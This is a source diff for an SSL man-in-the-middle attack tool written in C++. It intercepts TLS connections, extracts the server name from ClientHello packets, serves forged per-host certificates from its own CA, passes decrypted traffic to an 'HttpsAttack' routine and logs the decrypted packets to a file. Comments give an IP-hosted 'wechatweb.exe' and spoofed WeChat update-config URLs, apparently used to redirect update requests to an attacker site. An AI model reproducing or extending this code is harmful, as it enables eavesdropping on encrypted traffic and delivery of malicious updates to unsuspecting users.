@@ -45,13 +45,12 @@
 
 
 
-TOOLSLOCK gcertlock = { 0 };
+//TOOLSLOCK gcertlock = { 0 };
 
 int SSLProxy::SSL_ProxyMain(LPSSLPROXYPARAM spp) {
 	int				iCounter = 0;
 	int				iRet = 0;
 	unsigned char	recvBuffer[NETWORK_BUFFER_SIZE + 4];
-	char szout[1024];
 
 	iCounter = ReadPendingData((char*)recvBuffer, NETWORK_BUFFER_SIZE, spp->SSLToClient);
 	if (iCounter <= 0)			//if ret = 0, need to be further judgment
@@ -61,10 +60,10 @@ int SSLProxy::SSL_ProxyMain(LPSSLPROXYPARAM spp) {
 	else {
 		*(recvBuffer + iCounter) = 0;
 
-		//iRet = unzip((char*)recvBuffer, iCounter);
-		//if (iRet == 0) {
-		//	iRet = Public::writeFile(SSL_PROXY_FILE, recvBuffer, iCounter, "\r\n\r\nSSL PACKET:\r\n\r\n");
-		//}
+		iRet = unzip((char*)recvBuffer, iCounter);
+		if (iRet == 0) {
+			iRet = Public::writeFile(SSL_PROXY_FILE, recvBuffer, iCounter, "\r\n\r\nSSL PACKET:\r\n\r\n");
+		}
 	}
 
 	iRet = HttpsAttack::sslAttackProc((char*)recvBuffer, iCounter, spp);
@@ -76,31 +75,30 @@ int SSLProxy::SSL_ProxyMain(LPSSLPROXYPARAM spp) {
 	DWORD dwip = HttpUtils::getIPFromHost(spp->host);
 	if (dwip == 0) {
 #ifdef _DEBUG
-		log( "SSL getIPFromHost:%s error\r\n", spp->host);
+		log( "[%s %d]getIPFromHost:%s error\r\n",__FUNCTION__,__LINE__, spp->host);
 #endif
 		return FALSE;
 	}
-	else {
-		spp->sockToServer = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-		if (spp->sockToServer <= 0)
-		{
-			printf("%s SSLProxy server socket error:%d", spp->host, WSAGetLastError());
-			return FALSE;
-		}
 
-		int overtime = CONNECTION_TIME_OUT;
-		iRet = setsockopt(spp->sockToServer, SOL_SOCKET, SO_RCVTIMEO, (char *)&overtime, sizeof(int));
-		iRet += setsockopt(spp->sockToServer, SOL_SOCKET, SO_SNDTIMEO, (char *)&overtime, sizeof(int));
-
-		spp->saToServer.sin_addr.S_un.S_addr = dwip;
-		spp->saToServer.sin_port = ntohs(spp->usPort);
-		spp->saToServer.sin_family = AF_INET;
+	spp->sockToServer = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+	if (spp->sockToServer <= 0)
+	{
+		printf("[%s %d] error:%d", __FUNCTION__, __LINE__, WSAGetLastError());
+		return FALSE;
 	}
+
+	int overtime = CONNECTION_TIME_OUT;
+	iRet = setsockopt(spp->sockToServer, SOL_SOCKET, SO_RCVTIMEO, (char *)&overtime, sizeof(int));
+	iRet += setsockopt(spp->sockToServer, SOL_SOCKET, SO_SNDTIMEO, (char *)&overtime, sizeof(int));
+
+	spp->saToServer.sin_addr.S_un.S_addr = dwip;
+	spp->saToServer.sin_port = ntohs(spp->usPort);
+	spp->saToServer.sin_family = AF_INET;
 		
 	iRet = connect(spp->sockToServer, (struct sockaddr *)&(spp->saToServer), sizeof(sockaddr_in));
 	if (iRet )
 	{
-		printf("SSLProxy connect server:%s,ip:%08x error:%u\r\n", spp->host,
+		printf("[%s %d] connect server:%s,ip:%08x error:%u\r\n", __FUNCTION__, __LINE__, spp->host,
 			spp->saToServer.sin_addr.S_un.S_addr, WSAGetLastError());
 		return FALSE;
 	}
@@ -116,41 +114,38 @@ int SSLProxy::SSL_ProxyMain(LPSSLPROXYPARAM spp) {
 
 	if ((int)spp->ctxToServer <= 0)
 	{
-		printf("%s SSLProxy server SSL_CTX_new error\n", spp->host);
+		printf("[%s %d]SSL_CTX_new error\n", __FUNCTION__, __LINE__ );
 		return FALSE;
 	}
 
 	spp->SSLToServer = SSL_new(spp->ctxToServer);
 	if ((int)spp->SSLToServer <= 0)
 	{
-		printf("%s SSL_new server error\n",spp->host);
+		printf("[%s %d] SSL_new error\n", __FUNCTION__, __LINE__);
 		return FALSE;
 	}
 
 	iRet = SSL_set_fd(spp->SSLToServer, spp->sockToServer);
 	if (iRet != 1)
 	{
-		printf("SSLProxy %s SSL_set_fd errorcode:%d,error string:%s,description:%s,return:%d\n", spp->host,
-			SSL_get_error(spp->SSLToServer, iRet), SSL_state_string(spp->SSLToServer),
-			SSL_state_string_long(spp->SSLToServer), iRet);
+		printf("[%s %d]SSL_set_fd errorcode:%d,error string:%s,description:%s,result:%d\n", __FUNCTION__, __LINE__,
+			SSL_get_error(spp->SSLToServer, iRet), SSL_state_string(spp->SSLToServer),SSL_state_string_long(spp->SSLToServer), iRet);
 		return FALSE;
 	}
 
 	iRet = SSL_connect(spp->SSLToServer);
 	if (iRet != 1)
 	{
-		printf("SSLProxy %s SSL_connect errorcode:%d,error string:%s,description:%s,return:%d\n", spp->host,
-			SSL_get_error(spp->SSLToServer, iRet), SSL_state_string(spp->SSLToServer),
-			SSL_state_string_long(spp->SSLToServer), iRet);
+		printf("[%s %d]SSL_connect errorcode:%d,error string:%s,description:%s,result:%d\n", __FUNCTION__, __LINE__,
+			SSL_get_error(spp->SSLToServer, iRet), SSL_state_string(spp->SSLToServer),SSL_state_string_long(spp->SSLToServer), iRet);
 		return FALSE;
 	}
 
 	iRet = SSL_write(spp->SSLToServer, recvBuffer, iCounter);
 	if (iRet != iCounter)
 	{
-		printf("SSLProxy %s SSL_write errorcode:%d,error string:%s,description:%s,return:%d\n", spp->host,
-			SSL_get_error(spp->SSLToServer, iRet), SSL_state_string(spp->SSLToServer),
-			SSL_state_string_long(spp->SSLToServer), iRet);
+		printf("[%s %d]SSL_write errorcode:%d,error string:%s,description:%s,return:%d\n", __FUNCTION__, __LINE__,
+			SSL_get_error(spp->SSLToServer, iRet), SSL_state_string(spp->SSLToServer),SSL_state_string_long(spp->SSLToServer), iRet);
 		return FALSE;
 	}
 
@@ -254,37 +249,38 @@ int SSLProxy::SSL_ProxyClient(LPSSLPROXYPARAM spp) {
 		if (HttpUtils::isHttpPacket(szpeekbuf))
 		{
 			//return FALSE;
-
 			return HttpProxy::HttpProxyMain((LPHTTPPROXYPARAM)spp);
 		}
 		else {
-			iRet = getServerNameFromClientHello(szpeekbuf, peeklen,(unsigned char*)spp->host, spp->version);
+			iRet = getServerNameFromClientHello(szpeekbuf, peeklen,( char*)spp->host, spp->version);
 			if (iRet > 0)
 			{
 				iRet = SSLPublic::isTargetHost(spp->host);
 				if (iRet )
 				{
-
 				}
 				else {
 					return FALSE;
 					//return SSLRetransfer::RetransferProxyMain((LPHTTPPROXYPARAM)pstSSLProxyParam);
 				}
 			}
-			else {
-				//ip.host == 47.101.189.13 && !(tcp.port == 3389)
-				//https with ip
-				//https://47.101.189.13/test20190402/wechatweb.exe
-				//https://47.101.189.13:443/weixin/android/wxweb/updateConfig.xml
-				//https://dldir1.qq.com/weixin/android/wxweb/updateConfig.xml
+			else if (iRet == 0) {
 				//lstrcpyA(pstSSLProxyParam->host, gstrServerIP.c_str());
 				lstrcpyA(spp->host, MYOWNSITE_ATTACK_DOMAINNAME);
+				
+				//https://47.101.189.13/test20190402/wechatweb.exe
+				//https://47.101.189.13:443/weixin/android/wxweb/updateConfig.xml
+				//https://dldir1.qq.com/weixin/android/wxweb/updateConfig.xml	
+			}
+			else {
+				//not ssl
+				return FALSE;
 				//return SSLRetransfer::RetransferProxyMain((LPHTTPPROXYPARAM)pstSSLProxyParam);
 			}
 		}
 	}
 	else {
-		printf("ssl client recv MSG_PEEK error:%u\r\n", WSAGetLastError());
+		printf("[%s %d] MSG_PEEK size error:%u\r\n", __FUNCTION__, __LINE__, WSAGetLastError());
 		return -1;
 	}
 
@@ -305,7 +301,7 @@ int SSLProxy::SSL_ProxyClient(LPSSLPROXYPARAM spp) {
 
 	if (iRet == FALSE)
 	{
-		printf("SSL MakesureCertExist %s error\n", spp->host);
+		printf("[%s %d]MakesureCertExist server name:%s error\n", __FUNCTION__, __LINE__, spp->host);
 		return FALSE;
 	}
 
@@ -321,7 +317,7 @@ int SSLProxy::SSL_ProxyClient(LPSSLPROXYPARAM spp) {
 
 	if ((int)spp->ctxToClient <= 0)
 	{
-		printf("SSL_CTX_new %s error\n", spp->host);
+		printf("[%s %d]SSL_CTX_new %s error\n", __FUNCTION__, __LINE__, spp->host);
 		return FALSE;
 	}
 
@@ -331,18 +327,17 @@ int SSLProxy::SSL_ProxyClient(LPSSLPROXYPARAM spp) {
 	iRet = SSL_CTX_load_verify_locations(spp->ctxToClient, cafilename.c_str(), 0);
 	if (iRet != 1)
 	{
-		printf("SSL_CTX_load_verify_locations %s error\n", spp->host);
+		printf("[%s %d]SSL_CTX_load_verify_locations %s error\n", __FUNCTION__, __LINE__, spp->host);
 		return FALSE;
 	}
 
 	SSL_CTX_set_default_passwd_cb_userdata(spp->ctxToClient, PRIVATE_KEY_PWD);
 
 	string certfilename = gLocalPath + CERT_PATH + "\\" + string(spp->host) + ".crt";
-
 	iRet = SSL_CTX_use_certificate_file(spp->ctxToClient, certfilename.c_str(), SSL_FILETYPE_PEM);
 	if (iRet <= 0)
 	{
-		printf("SSL_CTX_use_certificate_file %s\n", spp->host);
+		printf("[%s %d]SSL_CTX_use_certificate_file %s\n", __FUNCTION__, __LINE__, certfilename.c_str());
 		return FALSE;
 	}
 
@@ -350,21 +345,21 @@ int SSLProxy::SSL_ProxyClient(LPSSLPROXYPARAM spp) {
 	iRet = SSL_CTX_use_PrivateKey_file(spp->ctxToClient, keyfilename.c_str(), SSL_FILETYPE_PEM);
 	if (iRet <= 0)
 	{
-		printf("SSL_CTX_use_certificate_file %s error\n", spp->host);
+		printf("[%s %d]SSL_CTX_use_certificate_file %s error\n", __FUNCTION__, __LINE__, keyfilename.c_str());
 		return FALSE;
 	}
 
 	iRet = SSL_CTX_check_private_key(spp->ctxToClient);
 	if (iRet <= 0)
 	{
-		printf("%s SSL_CTX_check_private_key error\n", spp->host);
+		printf("[%s %d]SSL_CTX_check_private_key %s error\n", __FUNCTION__, __LINE__, spp->host);
 		return FALSE;
 	}
 
 	spp->SSLToClient = SSL_new(spp->ctxToClient);
 	if ((int)spp->SSLToClient <= 0)
 	{
-		printf("SSL_new %s error\n", spp->host);
+		printf("[%s %d]SSL_new %s error\n", __FUNCTION__, __LINE__, spp->host);
 		return FALSE;
 	}
 
@@ -372,8 +367,7 @@ int SSLProxy::SSL_ProxyClient(LPSSLPROXYPARAM spp) {
 	if (iRet != 1)
 	{
 		printf("SSL_set_fd %s errorcode:%d,error string:%s,description:%s,return:%d\n", spp->host,
-			SSL_get_error(spp->SSLToClient, iRet), SSL_state_string(spp->SSLToClient),
-			SSL_state_string_long(spp->SSLToClient), iRet);
+			SSL_get_error(spp->SSLToClient, iRet), SSL_state_string(spp->SSLToClient),SSL_state_string_long(spp->SSLToClient), iRet);
 		return FALSE;
 	}
 
@@ -383,8 +377,7 @@ int SSLProxy::SSL_ProxyClient(LPSSLPROXYPARAM spp) {
 	if (iRet != 1)
 	{
 		printf("SSL_accept %s errorcode:%d,error string:%s,description:%s,return:%d\n", spp->host,
-			SSL_get_error(spp->SSLToClient, iRet), SSL_state_string(spp->SSLToClient),
-			SSL_state_string_long(spp->SSLToClient), iRet);
+			SSL_get_error(spp->SSLToClient, iRet), SSL_state_string(spp->SSLToClient),SSL_state_string_long(spp->SSLToClient), iRet);
 		return FALSE;
 	}
 
@@ -400,8 +393,6 @@ int SSLProxy::SSL_ProxyClient(LPSSLPROXYPARAM spp) {
 int __stdcall SSLProxy::SSL_Proxy(MIM_THREAD_PARAMS * param) {
 
 	LPSSLPROXYPARAM spp = 0;
-
-	char szout[1024] = { 0 };
 
 	int ret = 0;
 
@@ -425,7 +416,7 @@ int __stdcall SSLProxy::SSL_Proxy(MIM_THREAD_PARAMS * param) {
 		}
 		__except (1)
 		{
-			log(szout, "SSL服务器端线程发生异常,错误码:%u,线程ID:%u\r\n", GetLastError(),spp->ulThreadID);
+			log("[%s %d] exception code:%d thread id:%d\r\n", __FUNCTION__, __LINE__, GetLastError(),spp->ulThreadID);
 
 		}
 	}
@@ -440,7 +431,7 @@ SSLProxy::SSLProxy() {
 
 	mInstance = this;
 
-	Lock::initlock(gcertlock, "certlock", 3000);
+	//Lock::initlock(gcertlock, "certlock", 3000);
 }
 
 SSLProxy::~SSLProxy() {
@@ -461,56 +452,55 @@ SSLProxy::~SSLProxy() {
 
 //SSL_read_ex() and SSL_peek_ex() will return 1 for success or 0 for failure
 
-int SSLProxy::ReadPendingData(char * lpdata, int size, SSL * ssl) {
-	int ret = 0;
+int SSLProxy::ReadPendingData(char * buf, int bufSize, SSL * ssl) {
+	
 	int recvcnt = 0;
 	
 	int sslerror = 0;
 	
-	int accesssize = SSL_peek(ssl, lpdata + recvcnt, size - recvcnt);
-	if (accesssize <= 0)
+	int peeklen = SSL_peek(ssl, buf + recvcnt, bufSize - recvcnt);
+	if (peeklen <= 0)
 	{
 		return recvcnt;
 	}
 
 	do
 	{
-		ret = SSL_read(ssl, lpdata + recvcnt, size - recvcnt);
+		int rs = SSL_read(ssl, buf + recvcnt, bufSize - recvcnt);
 		//SSL_get_error(ssl, ret) == SSL_ERROR_WANT_READ
 		//pendsize = SSL_pending(ssl);	//always return 0
-		sslerror = SSL_get_error(ssl, ret);
-		if (sslerror != SSL_ERROR_NONE || ret <= 0)
+		sslerror = SSL_get_error(ssl, rs);
+		if (sslerror != SSL_ERROR_NONE || rs <= 0)
 		{
 			return recvcnt;
 		}
 		else {
-			recvcnt += ret;
+			recvcnt += rs;
 		}
-	} while (recvcnt < accesssize);
+	} while (recvcnt < peeklen);
 
-
-	int nextaccesssize = 0;
-	if (accesssize == 1)
+	int pnlen = 0;
+	if (peeklen == 1)
 	{
-		nextaccesssize = SSL_peek(ssl, lpdata + recvcnt, size - recvcnt);
-		if (nextaccesssize > 0)
+		pnlen = SSL_peek(ssl, buf + recvcnt, bufSize - recvcnt);
+		if (pnlen > 0)
 		{
-			ret = SSL_read(ssl, lpdata + recvcnt, size - recvcnt);
-			sslerror = SSL_get_error(ssl, ret);
-			if (sslerror != SSL_ERROR_NONE || ret <= 0 )
+			int rs = SSL_read(ssl, buf + recvcnt, bufSize - recvcnt);
+			sslerror = SSL_get_error(ssl, rs);
+			if (sslerror != SSL_ERROR_NONE || rs <= 0 )
 			{
-				printf("ReadPendingData sencondary SSL_read error:%u\r\n", sslerror);
+				log("%s %d error:%u\r\n", __FUNCTION__,__LINE__,sslerror);
 				return recvcnt;
 			}
 			else {
-				recvcnt += ret;
+				recvcnt += rs;
 			}
 		}
 	}
 
-	if (recvcnt != accesssize + nextaccesssize)
+	if (recvcnt != peeklen + pnlen)
 	{
-		printf("ReadPendingData result recvcnt:%u,accesssize:%u error\r\n", recvcnt, accesssize);
+		log("%s %d recv size:%u,peek size:%u ,peek second size:%u error\r\n", __FUNCTION__, __LINE__, recvcnt, peeklen, pnlen);
 	}
 	return recvcnt;
 }
@@ -518,7 +508,7 @@ int SSLProxy::ReadPendingData(char * lpdata, int size, SSL * ssl) {
 
 
 
-int SSLProxy::getServerNameFromClientHello(char * data, int len,unsigned char * servername, int & version) {
+int SSLProxy::getServerNameFromClientHello(char * data, int len,char * host, int & version) {
 
 #ifdef _DEBUG
 	FileOper::fileWriter("clienthello.dat", data, len);
@@ -529,16 +519,17 @@ int SSLProxy::getServerNameFromClientHello(char * data, int len,unsigned char * 
 		int mainver = lphdr->version & 0xff;
 		int subver = (lphdr->version & 0xff00) >> 8;
 
-		int handshakemainver = lphdr->handshakever & 0xff;
-		int handshakesubver = (lphdr->handshakever) >> 8;
-		if (mainver == 3 && handshakemainver == 3)
+		int hsmainver = lphdr->handshakever & 0xff;
+		int hssubver = (lphdr->handshakever) >> 8;
+		version = lphdr->version;
+
+		if (hsmainver == 3 && hssubver == 3)
 		{
-			version = lphdr->version;
-			//printf("ssl client hello version main version:%u,sub version:%u,handshake main version:%u,handshake sub version:%u\r\n",
-			//	mainver,subver,handshakemainver,handshakesubver);
+
 		}
 		else {
-			return -1;
+			log("[%s %d]client hello major version:%u,minor version:%u,handshake major version:%u,sub version:%u\r\n",
+				mainver,subver, hsmainver, hssubver);
 		}
 	}
 	else {
@@ -558,7 +549,7 @@ int SSLProxy::getServerNameFromClientHello(char * data, int len,unsigned char * 
 	int sslhellolen = ntohs(lphdr->hdrlen);
 	if (sslhellolen + 5 != len)
 	{
-		printf("ssl client hello header length:%u,size:%u\r\n", len, sslhellolen);
+		printf("[%s %d] client hello header length:%u not equal to packet size:%u\r\n", __FUNCTION__, __LINE__, sslhellolen,len);
 		return -1;		//ip segment packet,need to wait
 	}
 
@@ -566,7 +557,7 @@ int SSLProxy::getServerNameFromClientHello(char * data, int len,unsigned char * 
 	int cipherlen = ntohs(*(short*)ciphersuit);
 	if (cipherlen >= len || cipherlen <= 0)
 	{
-		printf("ssl client hello cipher suit length error\r\n");
+		printf("[%s %d] client hello cipher suit length error\r\n", __FUNCTION__, __LINE__);
 		return -1;
 	}
 
@@ -574,7 +565,7 @@ int SSLProxy::getServerNameFromClientHello(char * data, int len,unsigned char * 
 	int comppresslen = *compress;
 	if (comppresslen < 0)
 	{
-		printf("ssl client hello comppress methods length error\r\n");
+		printf("[%s %d] client hello comppress methods length error\r\n", __FUNCTION__, __LINE__);
 		return -1;
 	}
 
@@ -583,7 +574,8 @@ int SSLProxy::getServerNameFromClientHello(char * data, int len,unsigned char * 
 	int extbefore = lpexthdr - data + sizeof(short);
 	if (extbefore + extlen != len)
 	{
-		printf("client hello extensions length:%u,ext before length:%u,client hello length:%u\r\n", extlen, extbefore, len);
+		printf("[%s %d] client hello extensions length:%u,ext before length:%u,client hello packet length:%u error\r\n", 
+			__FUNCTION__, __LINE__,extlen, extbefore, len);
 		return -1;
 	}
 
@@ -595,20 +587,21 @@ int SSLProxy::getServerNameFromClientHello(char * data, int len,unsigned char * 
 			LPCLIENTHELLO_SERVERNAME lpserver = (LPCLIENTHELLO_SERVERNAME)lpext;
 			if (lpserver->servernametype == 0)
 			{
+				char* servername = (char*)((unsigned int)lpserver + sizeof(CLIENTHELLO_SERVERNAME));
+
 				int servernamelen = ntohs(lpserver->sernamelen);
 				if (servernamelen >= 256 || servernamelen <= 0)
 				{
-					printf("ssl client hello host name length:%u error\r\n", servernamelen);
+					printf("[%s %d]client hello host name:%s length:%u error\r\n", __FUNCTION__, __LINE__, servername, servernamelen);
 					return -1;
 				}
-				char * lpservername = (char*)((unsigned int)lpserver + sizeof(CLIENTHELLO_SERVERNAME));
-				memcpy(servername, lpservername, servernamelen);
-				*(servername + servernamelen) = 0;
+				
+				memcpy(host, servername, servernamelen);
+				*(host + servernamelen) = 0;
 				if (*servername >= 0x80 || *servername <= 0)
 				{
-					printf("get error client hello packet\r\n");
-					Public::writeFile(ATTACK_LOG_FILENAME, (char*)servername, servernamelen);
-					return 0;
+					log("[%s %d]client hello server name format error\r\n", __FUNCTION__, __LINE__);
+					return -1;
 				}
 				return servernamelen;
 			}
@@ -617,7 +610,7 @@ int SSLProxy::getServerNameFromClientHello(char * data, int len,unsigned char * 
 		int extblocksize = sizeof(SSLHEADER_EXTENSIONS) + ntohs(lpext->typelen);
 		if (extblocksize >= len || extblocksize <= 0)
 		{
-			printf("client hello extensions block size error\r\n");
+			printf("[%s %d] client hello extensions block size error\r\n", __FUNCTION__, __LINE__);
 			return -1;
 		}
 
